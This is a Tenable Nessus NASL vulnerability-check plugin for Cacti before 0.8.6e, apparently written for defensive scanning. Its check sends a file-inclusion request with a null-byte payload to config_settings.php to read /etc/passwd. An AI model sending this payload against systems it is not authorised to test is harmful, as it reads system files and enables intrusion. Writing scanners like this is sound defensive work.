#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18546);
  script_version("$Revision: 1.2 $");
  script_cve_id("CAN-2005-1524", "CAN-2005-1525", "CAN-2005-1526");
  script_bugtraq_id(14027, 14028, 14030, 14042);

  name["english"] = "Cacti < 0.8.6e Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running Cacti, a web-based frontend to RRDTool for
network graphing. 

The version of Cacti on the remote host suffers from several
vulnerabilities that may allow an attacker to browse arbitrary files on
the affected system, execute arbitrary code from the affected or a
third-party system, and launch SQL injection attacks against the
affected site. 

See also : http://www.idefense.com/application/poi/display?id=265
           http://www.idefense.com/application/poi/display?id=266
           http://www.idefense.com/application/poi/display?id=267
           http://www.securityfocus.com/archive/1/403174/30/0/threaded
Solution : Upgrade to Cacti 0.8.6e
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Cacti < 0.8.6e";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the file include flaws.
  req = http_get(
    item:string(
      dir, "/include/config_settings.php?",
      # nb: try to grab the password file.
      "config[include_path]=/etc/passwd%00"), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get the password file.
  if (egrep(string:res, pattern:"root:.+:0:[01]:")) {
    security_hole(port);
    exit(0);
  }
}
